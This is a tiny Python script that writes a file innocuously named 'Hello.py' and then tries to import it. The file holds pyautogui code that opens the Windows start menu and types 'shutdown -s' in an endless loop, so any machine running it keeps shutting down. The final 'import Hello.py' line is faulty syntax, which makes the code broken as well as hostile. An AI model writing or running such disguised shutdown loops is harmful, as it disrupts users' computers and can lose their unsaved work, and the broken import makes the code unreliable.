import pyautogui as pg, os, sys, time

HelloFile = open('Hello.py', 'w')
HelloFile.write(
"""
import pyautogui as pg, os, sys, time
pg.hotkey('winleft')

pg.typewrite('shell\\n')
time.sleep(2)


while True:

    pg.typewrite('shutdown -s\\n')
    time.sleep(1)

"""
)
HelloFile.close()

import Hello.py

